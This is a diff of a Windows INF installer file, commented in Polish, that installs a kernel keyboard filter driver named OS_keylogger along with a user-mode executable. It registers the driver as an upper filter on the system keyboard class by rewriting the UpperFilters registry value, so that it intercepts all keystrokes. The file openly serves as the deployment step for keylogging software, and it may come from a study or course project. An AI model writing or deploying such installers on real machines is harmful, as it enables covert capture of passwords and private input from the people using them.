@@ -1,9 +1,3 @@
-;
-; OS_keylogger.inf
-;
-; Instalacja sterownika filtra klawiatury (Keyboard Class Filter)
-;
-
 [Version]
 Signature   = "$WINDOWS NT$"
 Class       = Keyboard
@@ -20,31 +14,30 @@ DefaultDestDir = 12 ; Katalog C:\Windows\System32\drivers
 1 = %DiskName%,,,""
 
 [SourceDisksFiles]
-OS_keylogger.sys = 1,,
+OS_keylogger.sys = 1
+OS_keyloggerUserMode.exe = 1
 
 ; ================= Sekcja Instalacji (DefaultInstall) =================
 
 [DefaultInstall.NTamd64]
 CopyFiles = DriverFiles
+AddReg = Filter_AddReg
 
 [DefaultInstall.NTamd64.Services]
 AddService = OS_keylogger,, Service_Inst
 
-[DefaultInstall.NTamd64.HW]
-AddReg = Filter_AddReg
+
 
 ; ================= Kopiowanie Plików =================
 
 [DriverFiles]
 OS_keylogger.sys
+OS_keyloggerUserMode.exe
 
 ; ================= Rejestracja Filtra =================
 
 [Filter_AddReg]
-; Klucz: HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e96b...}
-; Wartoœæ: UpperFilters
-; Typ: REG_MULTI_SZ_APPEND (0x00010008)
-HKR,,"UpperFilters",0x00010008,"OS_keylogger"
+HKLM, SYSTEM\CurrentControlSet\Control\Class\{4d36e96b-e325-11ce-bfc1-08002be10318},UpperFilters,0x00010000,"OS_keylogger","kbdclass"
 
 ; ================= Konfiguracja Us³ugi =================
 
